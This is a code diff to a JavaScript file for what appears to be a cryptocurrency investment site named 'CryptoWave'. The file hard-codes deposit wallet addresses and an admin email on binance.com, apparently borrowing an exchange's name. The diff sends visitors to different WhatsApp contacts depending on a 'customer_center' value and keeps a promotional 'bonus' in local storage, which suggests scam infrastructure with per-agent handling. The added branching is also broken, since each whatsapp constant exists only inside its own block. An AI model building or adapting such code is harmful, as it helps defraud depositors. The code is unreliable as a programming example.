@@ -4,7 +4,16 @@ const usdt_wallet = "0x201f0E3BF1B176Ef29FEA4ac655c2c9627AB9586";
 const eth_wallet = "0x201f0E3BF1B176Ef29FEA4ac655c2c9627AB9586";
 const doge_wallet = "DLWzV8G5QE6xSu2AKvJ6Eq2DHaRgdnCxxp";
 const admin_email = "cryptocurrency@binance.com";
-const whatsapp = 'https://wa.me/16163302531';
+
+if ($("customer_center").val() == "anyi") {
+    const whatsapp = 'https://wa.me/15184680065';
+}
+else if ($("customer_center").val() == "akpaz") {
+    const whatsapp = 'https://wa.me/601111625319';
+}
+else {
+    const whatsapp = 'https://wa.me/16163302531';
+}
 // 
 
 if (!localStorage.hasOwnProperty('bonus')) {
@@ -49,7 +58,7 @@ const writeUp1 = `
 
 <h2>Introducing CryptoWave: Surf the Future of Finance!</h2>
 
-<img src="https://abouelghar12.github.io/pic/main_bg.avif">
+<img src="pic/main_bg.avif">
 
 <section>
 <p>
@@ -97,7 +106,7 @@ Embark on a journey of financial empowerment and unlock the door to boundless po
 
 const writeUp2 = `
 <h2>Introducing CryptoWave: Ride the Future of Finance!</h2>
-<img src="https://abouelghar12.github.io/pic/main_bg.jpg">
+<img src="pic/main_bg.jpg">
 <section>
 <p>
 Are you ready to embark on a groundbreaking journey into the world of digital finance? Look no further than CryptoWave – your ultimate gateway to the future of money.
